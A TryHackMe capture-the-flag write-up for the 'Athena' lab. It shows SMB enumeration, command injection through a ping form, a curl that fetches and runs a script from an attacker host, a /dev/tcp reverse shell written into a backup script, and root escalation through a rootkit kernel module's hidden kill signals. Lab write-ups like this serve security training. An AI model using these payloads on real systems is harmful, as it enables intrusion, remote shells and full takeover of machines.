# Athena Writeup - TryHackMe


First, we will enumerate port 139 using nmap to see if SMB is active

```nmap -sV -p139 --open -Pn 10.10.56.176 -v```

# output:

```  
Host is up (0.25s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4.6.2 
```


Let's try to connect using smbclient without using a password

```smbclient -L  \\10.10.56.176\\ -U ```

# output:

```
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	public          Disk
	IPC$            IPC       IPC Service (Samba 4.15.13-Ubuntu)
SMB1 disabled -- no workgroup available

```

Now, we can see the ```public``` directory. Let's try to access it.

```smbclient //10.10.56.176/public -U  ```

Now, let's read the file that is in this directory.

```more msg_for_administrator.txt```

# output:

```
Dear Administrator,

I would like to inform you that a new Ping system is being developed and I left the corresponding application in a specific path, which can be accessed through the following address: /myrouterpanel

Yours sincerely,

Athena
Intern

```

Now, let's access the /myrouterpanel directory in the web application and intercept it with BurpSuite.

Let's try a command injection encoded in ASCII
```
POST /myrouterpanel/ping.php HTTP/1.1
Host: 10.10.56.176
Content-Length: 29
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.56.176
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.56.176/myrouterpanel/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

ip=127.0.0.1%0Als -lasubmit=

```

# output:


```
HTTP/1.1 200 OK
Date: Mon, 18 Sep 2023 15:09:39 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 750
Connection: close
Content-Type: text/html; charset=UTF-8

<pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.024 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.036 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.034 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.055 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3051ms
rtt min/avg/max/mdev = 0.024/0.037/0.055/0.011 ms
total 24
drwxr-xr-x 2 root root 4096 May 23 13:08 .
drwxr-xr-x 3 root root 4096 Apr 19 16:44 ..
-rw-r--r-- 1 root root 1310 Apr 16 13:12 index.html
-rw-r--r-- 1 root root  767 May 23 12:55 ping.php
-rw-r--r-- 1 root root 1240 Apr 16 13:08 style.css
-rw-r--r-- 1 root root  211 Apr 15 08:30 under-construction.html
</pre>


```

Now, let's attempt to upload a reverse shell.

```
POST /myrouterpanel/ping.php HTTP/1.1
Host: 10.10.56.176
Content-Length: 84
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.56.176
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.56.176/myrouterpanel/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

ip=127.0.0.1%0Acurl http://10.9.58.67:8000/aoba.sh --output /dev/shm/aoba.sh&submit=


```

Now, let's try to see if the file was actually uploaded.

```
POST /myrouterpanel/ping.php HTTP/1.1
Host: 10.10.56.176
Content-Length: 46
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.56.176
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.56.176/myrouterpanel/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

ip=127.0.0.1%0Als -la /dev/shm/aoba.sh&submit=

```

# output:

```
HTTP/1.1 200 OK
Date: Mon, 18 Sep 2023 15:21:13 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 500
Connection: close
Content-Type: text/html; charset=UTF-8

<pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.018 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.035 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.034 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.033 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3077ms
rtt min/avg/max/mdev = 0.018/0.030/0.035/0.007 ms
-rw-r--r-- 1 www-data www-data 56 Sep 18 08:19 /dev/shm/aoba.sh
</pre>


```

Now, let's listen with netcat and execute our reverse shell.
# listen with netcat
```sudo nc -vnlp 4444```


# exec reverse shell

```
POST /myrouterpanel/ping.php HTTP/1.1
Host: 10.10.56.176
Content-Length: 46
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.56.176
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.56.176/myrouterpanel/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

ip=127.0.0.1%0Abash /dev/shm/aoba.sh&submit=

```

Now, let's make this shell more interactive using Python3.
```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@routerpanel:/var/www/html/myrouterpanel$

```


in ```/usr/share/backup  ```  have a file with permissions for the user 'athena' let's try to modify it to create a reverse shell for that user.

```www-data@routerpanel:/usr/share/backup$ ls -la ```


```
total 20
drwxr-xr-x   2 athena   www-data  4096 May 28 18:59 .
drwxr-xr-x 236 root     root     12288 May 26 12:44 ..
-rwxr-xr-x   1 www-data athena     258 May 28 18:59 backup.sh
```


Now, let's modify the script's content for our reverse shell.
```www-data@routerpanel:/usr/share/backup$ echo "/bin/sh -i >& /dev/tcp/10.9.58.67/3333 0>&1" > backup.sh ```

for get the user flag
```athena@routerpanel:/$ cat /home/athena/user.txt  ```


now let's use ```sudo -l ``` command

```
Matching Defaults entries for athena on routerpanel:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User athena may run the following commands on routerpanel:
    (root) NOPASSWD: /usr/sbin/insmod /mnt/.../secret/venom.ko

```

Now, let's navigate to the directory ```/mnt/.../secret/```

righ now we can see the ``venom.ko``` file

Now, let's analyze the venom.ko.

# how you need get it about hacked_kill function:

Function Purpose:
The hacked_kill function is part of a specialized software module that runs within the Linux kernel. Its primary purpose is to intercept and modify the behavior of process termination signals (often referred to as "kill" signals) in the operating system.

Input:

    The hacked_kill function takes one argument: pt_regs *pt_regs. This argument is a pointer to a data structure that contains information about the state of the processor's registers at the time the function is called.

Functionality:

    Inside the hacked_kill function, there is a series of conditional statements that examine the value of the signal passed as an argument.
    Depending on the specific value of the signal, the function performs different actions.
    For example, if the signal value is 0x39, it invokes a function named give_root(). This suggests that when a process sends this specific signal, it attempts to escalate its privileges to gain superuser (root) privileges.
    If the signal value is 0x3f, it is used to hide or unhide the kernel module itself. If the module is already hidden, it is unhidden, and vice versa.
    The function may also have other cases or actions associated with different signal values, but those are not explicitly described in the provided code snippet.

Output:

    The hacked_kill function doesn't produce any direct output. Its main purpose is to perform specific actions or manipulations based on the signal value it receives.

Context:

    The hacked_kill function is typically part of a larger software module or kernel extension.
    It is important to note that the code you provided appears to be specialized and potentially used for specific purposes, such as debugging, security research, or potentially even for malicious activities.
    Kernel modules like this one should be used with caution and only in controlled environments for legitimate purposes, as they can have serious implications for the stability and security of the operating system.
    
    
    

now let's run the rootkit

```athena@routerpanel:/mnt/.../secret$ sudo /usr/sbin/insmod /mnt/.../secret/venom.ko```

you will need decode 0x39 and 0x3f

now let's kill 57 and 63 process 

```athena@routerpanel:/mnt/.../secret$ kill -57 0  ```

```athena@routerpanel:/mnt/.../secret$ kill -63 0  ```

righ now you have root permission , nice job

```athena@routerpanel:/mnt/.../secret$ id;cat /root/root.txt   ```







